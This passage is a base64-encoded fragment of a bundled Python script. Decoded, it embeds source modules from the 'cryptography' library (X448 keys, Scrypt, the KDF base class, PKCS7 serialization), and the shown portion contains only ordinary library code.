F0ZV9ieXRlcyhzZWxmKSAtPiBieXRlczpcclxuICAgICAgICAjIFdoZW4gd2UgZHJvcCBzdXBwb3J0IGZvciBDUllQVE9HUkFQSFlfT1BFTlNTTF9MRVNTX1RIQU5fMTExIHdlIGNhblxyXG4gICAgICAgICMgc3dpdGNoIHRoaXMgdG8gRVZQX1BLRVlfbmV3X3Jhd19wcml2YXRlX2tleVxyXG4gICAgICAgICMgVGhlIHRyaWNrIHdlIHVzZSBoZXJlIGlzIHNlcmlhbGl6aW5nIHRvIGEgUEtDUzgga2V5IGFuZCBqdXN0XHJcbiAgICAgICAgIyB1c2luZyB0aGUgbGFzdCAzMiBieXRlcywgd2hpY2ggaXMgdGhlIGtleSBpdHNlbGYuXHJcbiAgICAgICAgYmlvID0gc2VsZi5fYmFja2VuZC5fY3JlYXRlX21lbV9iaW9fZ2MoKVxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2JhY2tlbmQuX2xpYi5pMmRfUEtDUzhQcml2YXRlS2V5X2JpbyhcclxuICAgICAgICAgICAgYmlvLFxyXG4gICAgICAgICAgICBzZWxmLl9ldnBfcGtleSxcclxuICAgICAgICAgICAgc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwsXHJcbiAgICAgICAgICAgIHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMLFxyXG4gICAgICAgICAgICAwLFxyXG4gICAgICAgICAgICBzZWxmLl9iYWNrZW5kLl9mZmkuTlVMTCxcclxuICAgICAgICAgICAgc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwsXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQocmVzID09IDEpXHJcbiAgICAgICAgcGtjczggPSBzZWxmLl9iYWNrZW5kLl9yZWFkX21lbV9iaW8oYmlvKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQobGVuKHBrY3M4KSA9PSA0OClcclxuICAgICAgICByZXR1cm4gcGtjczhbLV9YMjU1MTlfS0VZX1NJWkU6XVxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnY3J5cHRvZ3JhcGh5L2hhem1hdC9iYWNrZW5kcy9vcGVuc3NsL3g0NDgucHknLCBiJyMgVGhpcyBmaWxlIGlzIGR1YWwgbGljZW5zZWQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBBcGFjaGUgTGljZW5zZSwgVmVyc2lvblxyXG4jIDIuMCwgYW5kIHRoZSBCU0QgTGljZW5zZS4gU2VlIHRoZSBMSUNFTlNFIGZpbGUgaW4gdGhlIHJvb3Qgb2YgdGhpcyByZXBvc2l0b3J5XHJcbiMgZm9yIGNvbXBsZXRlIGRldGFpbHMuXHJcblxyXG5pbXBvcnQgdHlwaW5nXHJcblxyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMub3BlbnNzbC51dGlscyBpbXBvcnQgX2V2cF9wa2V5X2Rlcml2ZVxyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcyBpbXBvcnQgc2VyaWFsaXphdGlvblxyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5hc3ltbWV0cmljLng0NDggaW1wb3J0IChcclxuICAgIFg0NDhQcml2YXRlS2V5LFxyXG4gICAgWDQ0OFB1YmxpY0tleSxcclxuKVxyXG5cclxuaWYgdHlwaW5nLlRZUEVfQ0hFQ0tJTkc6XHJcbiAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMub3BlbnNzbC5iYWNrZW5kIGltcG9ydCBCYWNrZW5kXHJcblxyXG5fWDQ0OF9LRVlfU0laRSA9IDU2XHJcblxyXG5cclxuY2xhc3MgX1g0NDhQdWJsaWNLZXkoWDQ0OFB1YmxpY0tleSk6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgYmFja2VuZDogIkJhY2tlbmQiLCBldnBfcGtleSk6XHJcbiAgICAgICAgc2VsZi5fYmFja2VuZCA9IGJhY2tlbmRcclxuICAgICAgICBzZWxmLl9ldnBfcGtleSA9IGV2cF9wa2V5XHJcblxyXG4gICAgZGVmIHB1YmxpY19ieXRlcyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIGVuY29kaW5nOiBzZXJpYWxpemF0aW9uLkVuY29kaW5nLFxyXG4gICAgICAgIGZvcm1hdDogc2VyaWFsaXphdGlvbi5QdWJsaWNGb3JtYXQsXHJcbiAgICApIC0+IGJ5dGVzOlxyXG4gICAgICAgIGlmIChcclxuICAgICAgICAgICAgZW5jb2RpbmcgaXMgc2VyaWFsaXphdGlvbi5FbmNvZGluZy5SYXdcclxuICAgICAgICAgICAgb3IgZm9ybWF0IGlzIHNlcmlhbGl6YXRpb24uUHVibGljRm9ybWF0LlJhd1xyXG4gICAgICAgICk6XHJcbiAgICAgICAgICAgIGlmIChcclxuICAgICAgICAgICAgICAgIGVuY29kaW5nIGlzIG5vdCBzZXJpYWxpemF0aW9uLkVuY29kaW5nLlJhd1xyXG4gICAgICAgICAgICAgICAgb3IgZm9ybWF0IGlzIG5vdCBzZXJpYWxpemF0aW9uLlB1YmxpY0Zvcm1hdC5SYXdcclxuICAgICAgICAgICAgKTpcclxuICAgICAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAgICAgIldoZW4gdXNpbmcgUmF3IGJvdGggZW5jb2RpbmcgYW5kIGZvcm1hdCBtdXN0IGJlIFJhdyJcclxuICAgICAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgICAgIHJldHVybiBzZWxmLl9yYXdfcHVibGljX2J5dGVzKClcclxuXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2JhY2tlbmQuX3B1YmxpY19rZXlfYnl0ZXMoXHJcbiAgICAgICAgICAgIGVuY29kaW5nLCBmb3JtYXQsIHNlbGYsIHNlbGYuX2V2cF9wa2V5LCBOb25lXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGRlZiBfcmF3X3B1YmxpY19ieXRlcyhzZWxmKSAtPiBieXRlczpcclxuICAgICAgICBidWYgPSBzZWxmLl9iYWNrZW5kLl9mZmkubmV3KCJ1bnNpZ25lZCBjaGFyIFtdIiwgX1g0NDhfS0VZX1NJWkUpXHJcbiAgICAgICAgYnVmbGVuID0gc2VsZi5fYmFja2VuZC5fZmZpLm5ldygic2l6ZV90ICoiLCBfWDQ0OF9LRVlfU0laRSlcclxuICAgICAgICByZXMgPSBzZWxmLl9iYWNrZW5kLl9saWIuRVZQX1BLRVlfZ2V0X3Jhd19wdWJsaWNfa2V5KFxyXG4gICAgICAgICAgICBzZWxmLl9ldnBfcGtleSwgYnVmLCBidWZsZW5cclxuICAgICAgICApXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChyZXMgPT0gMSlcclxuICAgICAgICBzZWxmLl9iYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KGJ1ZmxlblswXSA9PSBfWDQ0OF9LRVlfU0laRSlcclxuICAgICAgICByZXR1cm4gc2VsZi5fYmFja2VuZC5fZmZpLmJ1ZmZlcihidWYsIF9YNDQ4X0tFWV9TSVpFKVs6XVxyXG5cclxuXHJcbmNsYXNzIF9YNDQ4UHJpdmF0ZUtleShYNDQ4UHJpdmF0ZUtleSk6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgYmFja2VuZDogIkJhY2tlbmQiLCBldnBfcGtleSk6XHJcbiAgICAgICAgc2VsZi5fYmFja2VuZCA9IGJhY2tlbmRcclxuICAgICAgICBzZWxmLl9ldnBfcGtleSA9IGV2cF9wa2V5XHJcblxyXG4gICAgZGVmIHB1YmxpY19rZXkoc2VsZikgLT4gWDQ0OFB1YmxpY0tleTpcclxuICAgICAgICBidWYgPSBzZWxmLl9iYWNrZW5kLl9mZmkubmV3KCJ1bnNpZ25lZCBjaGFyIFtdIiwgX1g0NDhfS0VZX1NJWkUpXHJcbiAgICAgICAgYnVmbGVuID0gc2VsZi5fYmFja2VuZC5fZmZpLm5ldygic2l6ZV90ICoiLCBfWDQ0OF9LRVlfU0laRSlcclxuICAgICAgICByZXMgPSBzZWxmLl9iYWNrZW5kLl9saWIuRVZQX1BLRVlfZ2V0X3Jhd19wdWJsaWNfa2V5KFxyXG4gICAgICAgICAgICBzZWxmLl9ldnBfcGtleSwgYnVmLCBidWZsZW5cclxuICAgICAgICApXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChyZXMgPT0gMSlcclxuICAgICAgICBzZWxmLl9iYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KGJ1ZmxlblswXSA9PSBfWDQ0OF9LRVlfU0laRSlcclxuICAgICAgICBwdWJsaWNfYnl0ZXMgPSBzZWxmLl9iYWNrZW5kLl9mZmkuYnVmZmVyKGJ1ZilbOl1cclxuICAgICAgICByZXR1cm4gc2VsZi5fYmFja2VuZC54NDQ4X2xvYWRfcHVibGljX2J5dGVzKHB1YmxpY19ieXRlcylcclxuXHJcbiAgICBkZWYgZXhjaGFuZ2Uoc2VsZiwgcGVlcl9wdWJsaWNfa2V5OiBYNDQ4UHVibGljS2V5KSAtPiBieXRlczpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShwZWVyX3B1YmxpY19rZXksIFg0NDhQdWJsaWNLZXkpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoInBlZXJfcHVibGljX2tleSBtdXN0IGJlIFg0NDhQdWJsaWNLZXkuIilcclxuXHJcbiAgICAgICAgcmV0dXJuIF9ldnBfcGtleV9kZXJpdmUoc2VsZi5fYmFja2VuZCwgc2VsZi5fZXZwX3BrZXksIHBlZXJfcHVibGljX2tleSlcclxuXHJcbiAgICBkZWYgcHJpdmF0ZV9ieXRlcyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIGVuY29kaW5nOiBzZXJpYWxpemF0aW9uLkVuY29kaW5nLFxyXG4gICAgICAgIGZvcm1hdDogc2VyaWFsaXphdGlvbi5Qcml2YXRlRm9ybWF0LFxyXG4gICAgICAgIGVuY3J5cHRpb25fYWxnb3JpdGhtOiBzZXJpYWxpemF0aW9uLktleVNlcmlhbGl6YXRpb25FbmNyeXB0aW9uLFxyXG4gICAgKSAtPiBieXRlczpcclxuICAgICAgICBpZiAoXHJcbiAgICAgICAgICAgIGVuY29kaW5nIGlzIHNlcmlhbGl6YXRpb24uRW5jb2RpbmcuUmF3XHJcbiAgICAgICAgICAgIG9yIGZvcm1hdCBpcyBzZXJpYWxpemF0aW9uLlB1YmxpY0Zvcm1hdC5SYXdcclxuICAgICAgICApOlxyXG4gICAgICAgICAgICBpZiAoXHJcbiAgICAgICAgICAgICAgICBmb3JtYXQgaXMgbm90IHNlcmlhbGl6YXRpb24uUHJpdmF0ZUZvcm1hdC5SYXdcclxuICAgICAgICAgICAgICAgIG9yIGVuY29kaW5nIGlzIG5vdCBzZXJpYWxpemF0aW9uLkVuY29kaW5nLlJhd1xyXG4gICAgICAgICAgICAgICAgb3Igbm90IGlzaW5zdGFuY2UoXHJcbiAgICAgICAgICAgICAgICAgICAgZW5jcnlwdGlvbl9hbGdvcml0aG0sIHNlcmlhbGl6YXRpb24uTm9FbmNyeXB0aW9uXHJcbiAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgICk6XHJcbiAgICAgICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgICAgICJXaGVuIHVzaW5nIFJhdyBib3RoIGVuY29kaW5nIGFuZCBmb3JtYXQgbXVzdCBiZSBSYXcgIlxyXG4gICAgICAgICAgICAgICAgICAgICJhbmQgZW5jcnlwdGlvbl9hbGdvcml0aG0gbXVzdCBiZSBOb0VuY3J5cHRpb24oKSJcclxuICAgICAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgICAgIHJldHVybiBzZWxmLl9yYXdfcHJpdmF0ZV9ieXRlcygpXHJcblxyXG4gICAgICAgIHJldHVybiBzZWxmLl9iYWNrZW5kLl9wcml2YXRlX2tleV9ieXRlcyhcclxuICAgICAgICAgICAgZW5jb2RpbmcsIGZvcm1hdCwgZW5jcnlwdGlvbl9hbGdvcml0aG0sIHNlbGYsIHNlbGYuX2V2cF9wa2V5LCBOb25lXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGRlZiBfcmF3X3ByaXZhdGVfYnl0ZXMoc2VsZikgLT4gYnl0ZXM6XHJcbiAgICAgICAgYnVmID0gc2VsZi5fYmFja2VuZC5fZmZpLm5ldygidW5zaWduZWQgY2hhciBbXSIsIF9YNDQ4X0tFWV9TSVpFKVxyXG4gICAgICAgIGJ1ZmxlbiA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5uZXcoInNpemVfdCAqIiwgX1g0NDhfS0VZX1NJWkUpXHJcbiAgICAgICAgcmVzID0gc2VsZi5fYmFja2VuZC5fbGliLkVWUF9QS0VZX2dldF9yYXdfcHJpdmF0ZV9rZXkoXHJcbiAgICAgICAgICAgIHNlbGYuX2V2cF9wa2V5LCBidWYsIGJ1ZmxlblxyXG4gICAgICAgIClcclxuICAgICAgICBzZWxmLl9iYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KHJlcyA9PSAxKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQoYnVmbGVuWzBdID09IF9YNDQ4X0tFWV9TSVpFKVxyXG4gICAgICAgIHJldHVybiBzZWxmLl9iYWNrZW5kLl9mZmkuYnVmZmVyKGJ1ZiwgX1g0NDhfS0VZX1NJWkUpWzpdXHJcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdjcnlwdG9ncmFwaHkvaGF6bWF0L3ByaW1pdGl2ZXMva2RmL19faW5pdF9fLnB5JywgYicjIFRoaXMgZmlsZSBpcyBkdWFsIGxpY2Vuc2VkIHVuZGVyIHRoZSB0ZXJtcyBvZiB0aGUgQXBhY2hlIExpY2Vuc2UsIFZlcnNpb25cclxuIyAyLjAsIGFuZCB0aGUgQlNEIExpY2Vuc2UuIFNlZSB0aGUgTElDRU5TRSBmaWxlIGluIHRoZSByb290IG9mIHRoaXMgcmVwb3NpdG9yeVxyXG4jIGZvciBjb21wbGV0ZSBkZXRhaWxzLlxyXG5cclxuXHJcbmltcG9ydCBhYmNcclxuXHJcblxyXG5jbGFzcyBLZXlEZXJpdmF0aW9uRnVuY3Rpb24obWV0YWNsYXNzPWFiYy5BQkNNZXRhKTpcclxuICAgIEBhYmMuYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBkZXJpdmUoc2VsZiwga2V5X21hdGVyaWFsOiBieXRlcykgLT4gYnl0ZXM6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgRGV0ZXJtaW5pc3RpY2FsbHkgZ2VuZXJhdGVzIGFuZCByZXR1cm5zIGEgbmV3IGtleSBiYXNlZCBvbiB0aGUgZXhpc3RpbmdcclxuICAgICAgICBrZXkgbWF0ZXJpYWwuXHJcbiAgICAgICAgIiIiXHJcblxyXG4gICAgQGFiYy5hYnN0cmFjdG1ldGhvZFxyXG4gICAgZGVmIHZlcmlmeShzZWxmLCBrZXlfbWF0ZXJpYWw6IGJ5dGVzLCBleHBlY3RlZF9rZXk6IGJ5dGVzKSAtPiBOb25lOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIENoZWNrcyB3aGV0aGVyIHRoZSBrZXkgZ2VuZXJhdGVkIGJ5IHRoZSBrZXkgbWF0ZXJpYWwgbWF0Y2hlcyB0aGVcclxuICAgICAgICBleHBlY3RlZCBkZXJpdmVkIGtleS4gUmFpc2VzIGFuIGV4Y2VwdGlvbiBpZiB0aGV5IGRvIG5vdCBtYXRjaC5cclxuICAgICAgICAiIiJcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2NyeXB0b2dyYXBoeS9oYXptYXQvcHJpbWl0aXZlcy9rZGYvc2NyeXB0LnB5JywgYicjIFRoaXMgZmlsZSBpcyBkdWFsIGxpY2Vuc2VkIHVuZGVyIHRoZSB0ZXJtcyBvZiB0aGUgQXBhY2hlIExpY2Vuc2UsIFZlcnNpb25cclxuIyAyLjAsIGFuZCB0aGUgQlNEIExpY2Vuc2UuIFNlZSB0aGUgTElDRU5TRSBmaWxlIGluIHRoZSByb290IG9mIHRoaXMgcmVwb3NpdG9yeVxyXG4jIGZvciBjb21wbGV0ZSBkZXRhaWxzLlxyXG5cclxuXHJcbmltcG9ydCBzeXNcclxuaW1wb3J0IHR5cGluZ1xyXG5cclxuZnJvbSBjcnlwdG9ncmFwaHkgaW1wb3J0IHV0aWxzXHJcbmZyb20gY3J5cHRvZ3JhcGh5LmV4Y2VwdGlvbnMgaW1wb3J0IChcclxuICAgIEFscmVhZHlGaW5hbGl6ZWQsXHJcbiAgICBJbnZhbGlkS2V5LFxyXG4gICAgVW5zdXBwb3J0ZWRBbGdvcml0aG0sXHJcbilcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMgaW1wb3J0IGNvbnN0YW50X3RpbWVcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMua2RmIGltcG9ydCBLZXlEZXJpdmF0aW9uRnVuY3Rpb25cclxuXHJcblxyXG4jIFRoaXMgaXMgdXNlZCBieSB0aGUgc2NyeXB0IHRlc3RzIHRvIHNraXAgdGVzdHMgdGhhdCByZXF1aXJlIG1vcmUgbWVtb3J5XHJcbiMgdGhhbiB0aGUgTUVNX0xJTUlUXHJcbl9NRU1fTElNSVQgPSBzeXMubWF4c2l6ZSAvLyAyXHJcblxyXG5cclxuY2xhc3MgU2NyeXB0KEtleURlcml2YXRpb25GdW5jdGlvbik6XHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBzYWx0OiBieXRlcyxcclxuICAgICAgICBsZW5ndGg6IGludCxcclxuICAgICAgICBuOiBpbnQsXHJcbiAgICAgICAgcjogaW50LFxyXG4gICAgICAgIHA6IGludCxcclxuICAgICAgICBiYWNrZW5kOiB0eXBpbmcuQW55ID0gTm9uZSxcclxuICAgICk6XHJcbiAgICAgICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzLm9wZW5zc2wuYmFja2VuZCBpbXBvcnQgKFxyXG4gICAgICAgICAgICBiYWNrZW5kIGFzIG9zc2wsXHJcbiAgICAgICAgKVxyXG5cclxuICAgICAgICBpZiBub3Qgb3NzbC5zY3J5cHRfc3VwcG9ydGVkKCk6XHJcbiAgICAgICAgICAgIHJhaXNlIFVuc3VwcG9ydGVkQWxnb3JpdGhtKFxyXG4gICAgICAgICAgICAgICAgIlRoaXMgdmVyc2lvbiBvZiBPcGVuU1NMIGRvZXMgbm90IHN1cHBvcnQgc2NyeXB0IlxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgc2VsZi5fbGVuZ3RoID0gbGVuZ3RoXHJcbiAgICAgICAgdXRpbHMuX2NoZWNrX2J5dGVzKCJzYWx0Iiwgc2FsdClcclxuICAgICAgICBpZiBuIDwgMiBvciAobiAmIChuIC0gMSkpICE9IDA6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIm4gbXVzdCBiZSBncmVhdGVyIHRoYW4gMSBhbmQgYmUgYSBwb3dlciBvZiAyLiIpXHJcblxyXG4gICAgICAgIGlmIHIgPCAxOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJyIG11c3QgYmUgZ3JlYXRlciB0aGFuIG9yIGVxdWFsIHRvIDEuIilcclxuXHJcbiAgICAgICAgaWYgcCA8IDE6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoInAgbXVzdCBiZSBncmVhdGVyIHRoYW4gb3IgZXF1YWwgdG8gMS4iKVxyXG5cclxuICAgICAgICBzZWxmLl91c2VkID0gRmFsc2VcclxuICAgICAgICBzZWxmLl9zYWx0ID0gc2FsdFxyXG4gICAgICAgIHNlbGYuX24gPSBuXHJcbiAgICAgICAgc2VsZi5fciA9IHJcclxuICAgICAgICBzZWxmLl9wID0gcFxyXG5cclxuICAgIGRlZiBkZXJpdmUoc2VsZiwga2V5X21hdGVyaWFsOiBieXRlcykgLT4gYnl0ZXM6XHJcbiAgICAgICAgaWYgc2VsZi5fdXNlZDpcclxuICAgICAgICAgICAgcmFpc2UgQWxyZWFkeUZpbmFsaXplZCgiU2NyeXB0IGluc3RhbmNlcyBjYW4gb25seSBiZSB1c2VkIG9uY2UuIilcclxuICAgICAgICBzZWxmLl91c2VkID0gVHJ1ZVxyXG5cclxuICAgICAgICB1dGlscy5fY2hlY2tfYnl0ZXNsaWtlKCJrZXlfbWF0ZXJpYWwiLCBrZXlfbWF0ZXJpYWwpXHJcbiAgICAgICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzLm9wZW5zc2wuYmFja2VuZCBpbXBvcnQgYmFja2VuZFxyXG5cclxuICAgICAgICByZXR1cm4gYmFja2VuZC5kZXJpdmVfc2NyeXB0KFxyXG4gICAgICAgICAgICBrZXlfbWF0ZXJpYWwsIHNlbGYuX3NhbHQsIHNlbGYuX2xlbmd0aCwgc2VsZi5fbiwgc2VsZi5fciwgc2VsZi5fcFxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgdmVyaWZ5KHNlbGYsIGtleV9tYXRlcmlhbDogYnl0ZXMsIGV4cGVjdGVkX2tleTogYnl0ZXMpIC0+IE5vbmU6XHJcbiAgICAgICAgZGVyaXZlZF9rZXkgPSBzZWxmLmRlcml2ZShrZXlfbWF0ZXJpYWwpXHJcbiAgICAgICAgaWYgbm90IGNvbnN0YW50X3RpbWUuYnl0ZXNfZXEoZGVyaXZlZF9rZXksIGV4cGVjdGVkX2tleSk6XHJcbiAgICAgICAgICAgIHJhaXNlIEludmFsaWRLZXkoIktleXMgZG8gbm90IG1hdGNoLiIpXHJcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdjcnlwdG9ncmFwaHkvaGF6bWF0L3ByaW1pdGl2ZXMvc2VyaWFsaXphdGlvbi9wa2NzNy5weScsIGInIyBUaGlzIGZpbGUgaXMgZHVhbCBsaWNlbnNlZCB1bmRlciB0aGUgdGVybXMgb2YgdGhlIEFwYWNoZSBMaWNlbnNlLCBWZXJzaW9uXHJcbiMgMi4wLCBhbmQgdGhlIEJTRCBMaWNlbnNlLiBTZWUgdGhlIExJQ0VOU0UgZmlsZSBpbiB0aGUgcm9vdCBvZiB0aGlzIHJlcG9zaXRvcnlcclxuIyBmb3IgY29tcGxldGUgZGV0YWlscy5cclxuXHJcbmltcG9ydCB0eXBpbmdcclxuXHJcbmZyb20gY3J5cHRvZ3JhcGh5IGltcG9ydCB1dGlsc1xyXG5mcm9tIGNyeXB0b2dyYXBoeSBpbXBvcnQgeDUwOVxyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcyBpbXBvcnQgaGFzaGVzLCBzZXJpYWxpemF0aW9uXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5wcmltaXRpdmVzLmFzeW1tZXRyaWMgaW1wb3J0IGVjLCByc2FcclxuZnJvbSBjcnlwdG9ncmFwaHkudXRpbHMgaW1wb3J0IF9jaGVja19ieXRlc2xpa2VcclxuXHJcblxyXG5kZWYgbG9hZF9wZW1fcGtjczdfY2VydGlmaWNhdGVzKGRhdGE6IGJ5dGVzKSAtPiB0eXBpbmcuTGlzdFt4NTA5LkNlcnRpZmljYXRlXTpcclxuICAgIGZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5iYWNrZW5kcy5vcGVuc3NsLmJhY2tlbmQgaW1wb3J0IGJhY2tlbmRcclxuXHJcbiAgICByZXR1cm4gYmFja2VuZC5sb2FkX3BlbV9wa2NzN19jZXJ0aWZpY2F0ZXMoZGF0YSlcclxuXHJcblxyXG5kZWYgbG9hZF9kZXJfcGtjczdfY2VydGlmaWNhdGVzKGRhdGE6IGJ5dGVzKSAtPiB0eXBpbmcuTGlzdFt4NTA5LkNlcnRpZmljYXRlXTpcclxuICAgIGZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5iYWNrZW5kcy5vcGVuc3NsLmJhY2tlbmQgaW1wb3J0IGJhY2tlbmRcclxuXHJcbiAgICByZXR1cm4gYmFja2VuZC5sb2FkX2Rlcl9wa2NzN19jZXJ0aWZpY2F0ZXMoZGF0YSlcclxuXHJcblxyXG5kZWYgc2VyaWFsaXplX2NlcnRpZmljYXRlcyhcclxuICAgIGNlcnRzOiB0eXBpbmcuTGlzdFt4NTA5LkNlcnRpZmljYXRlXSxcclxuICAgIGVuY29kaW5nOiBzZXJpYWxpemF0aW9uLkVuY29kaW5nLFxyXG4pIC0+IGJ5dGVzOlxyXG4gICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzLm9wZW5zc2wuYmFja2VuZCBpbXBvcnQgYmFja2VuZFxyXG5cclxuICAgIHJldHVybiBiYWNrZW5kLnBrY3M3X3NlcmlhbGl6ZV9jZXJ0aWZpY2F0ZXMoY2VydHMsIGVuY29kaW5nKVxyXG5cclxuXHJcbl9BTExPV0VEX1BLQ1M3X0hBU0hfVFlQRVMgPSB0eXBpbmcuVW5pb25bXHJcbiAgICBoYXNoZXMuU0hBMSxcclxuICAgIGhhc2hlcy5TSEEyMjQsXHJcbiAgICBoYXNoZXMuU0hBMjU2LFxyXG4gICAgaGFzaGVzLlNIQTM4NCxcclxuICAgIGhhc2hlcy5TSEE1MTIsXHJcbl1cclxuXHJcbl9BTExPV0VEX1BSSVZBVEVfS0VZX1RZUEVTID0gdHlwaW5nLlVuaW9uW1xyXG4gICAgcnNhLlJTQVByaXZhdGVLZXksIGVjLkVsbGlwdGljQ3VydmVQcml2YXRlS2V5XHJcbl1cclxuXHJcblxyXG5jbGFzcyBQS0NTN09wdGlvbnModXRpbHMuRW51bSk6XHJcbiAgICBUZXh0ID0gIkFkZCB0ZXh0L3BsYWluIE1JTUUgdHlwZSJcclxuICAgIEJpbmFyeSA9ICJEb25cJ3QgdHJhbnNsYXRlIGlucHV0IGRhdGEgaW50byBjYW5vbmljYWwgTUlNRSBmb3JtYXQiXHJcbiAgICBEZXRhY2hlZFNpZ25hdHVyZSA9ICJEb25cJ3QgZW1iZWQgZGF0YSBpbiB0aGUgUEtDUzcgc3RydWN0dXJlIlxyXG4gICAgTm9DYXBhYmlsaXRpZXMgPSAiRG9uXCd0IGVtYmVkIFNNSU1FIGNhcGFiaWxpdGllcyJcclxuICAgIE5vQXR0cmlidXRlcyA9ICJEb25cJ3QgZW1iZWQgYXV0aGVudGljYXRlZEF0dHJpYnV0ZXMiXHJcbiAgICBOb0NlcnRzID0gIkRvblwndCBlbWJlZCBzaWduZXIgY2VydGlmaWNhdGUiXHJcblxyXG5cclxuY2xhc3MgUEtDUzdTaWduYXR1cmVCdWlsZGVyOlxyXG4gICAgZGVmIF9faW5pdF9fKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgZGF0YTogdHlwaW5nLk9wdGlvbmFsW2J5dGVzXSA9IE5vbmUsXHJcbiAgICAgICAgc2lnbmVyczogdHlwaW5nLkxpc3RbXHJcbiAgICAgICAgICAgIHR5cGluZy5UdXBsZVtcclxuICAgICAgICAgICAgICAgIHg1MDkuQ2VydGlmaWNhdGUsXHJcbiAgICAgICAgICAgICAgICBfQUxMT1dFRF9QUklWQVRFX0tFWV9UWVBFUyxcclxuICAgICAgICAgICAgICAgIF9BTExPV0VEX1BLQ1M3X0hBU0hfVFlQRVMsXHJcbiAgICAgICAgICAgIF1cclxuICAgICAgICBdID0gW10sXHJcbiAgICAgICAgYWRkaXRpb25hbF9jZXJ0czogdHlwaW5nLkxpc3RbeDUwOS5DZXJ0aWZpY2F0ZV0gPSBbXSxcclxuICAgICk6XHJcbiAgICAgICAgc2VsZi5fZGF0YSA9IGRhdGFcclxuICAgICAgICBzZWxmLl9zaWduZXJzID0gc2lnbmVyc1xyXG4gICAgICAgIHNlbGYuX2FkZGl0aW9uYWxfY2VydHMgPSBhZGRpdGlvbmFsX2NlcnRzXHJcblxyXG4gICAgZGVmIHNldF9kYXRhKHNlbGYsIGRhdGE6IGJ5dGVzKSAtPiAiUEtDUzdTaWduYXR1cmVCdWlsZGVyIjpcclxuICAgICAgICBfY2hlY2tfYnl0ZXNsaWtlKCJkYXRhIiwgZGF0YSlcclxuICAgICAgICBpZiBzZWxmLl9kYXRhIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJkYXRhIG1heSBvbmx5IGJlIHNldCBvbmNlIilcclxuXHJcbiAgICAgICAgcmV0dXJuIFBLQ1M3U2lnbmF0dXJlQnVpbGRlcihkYXRhLCBzZWxmLl9zaWduZXJzKVxyXG5cclxuICAgIGRlZiBhZGRfc2lnbmVyKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgY2VydGlmaWNhdGU6IHg1MDkuQ2VydGlmaWNhdGUsXHJcbiAgICAgICAgcHJpdmF0ZV9rZXk6IF9BTExPV0VEX1BSSVZBVEVfS0VZX1RZUEVTLFxyXG4gICAgICAgIGhhc2hfYWxnb3JpdGhtOiBfQUxMT1dFRF9QS0NTN19IQVNIX1RZUEVTLFxyXG4gICAgKSAtPi